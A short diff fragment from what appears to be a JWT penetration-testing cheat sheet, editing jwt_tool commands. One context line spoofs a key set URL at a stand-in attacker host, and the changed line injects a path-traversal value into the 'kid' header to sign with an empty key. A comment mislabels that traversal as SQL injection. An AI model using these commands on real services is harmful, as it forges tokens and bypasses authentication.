@@ -189,7 +189,7 @@ python3 jwt_tool.py "$JWT" -X s -ju "https://attacker.example.com/jwks.json"
 
 # 2. KID (Key ID) injection
 # SQL injection in kid parameter
-python3 jwt_tool.py "$JWT" -I -hc kid -hv "../../dev/null" -S hs256 -p ""
+python3 jwt_tool.py "$JWT" -I -hc kid -hv "dev/null" -S hs256 -p ""
 # If kid is used in file path lookup, point to /dev/null (empty key)
 
 # SQL injection via kid
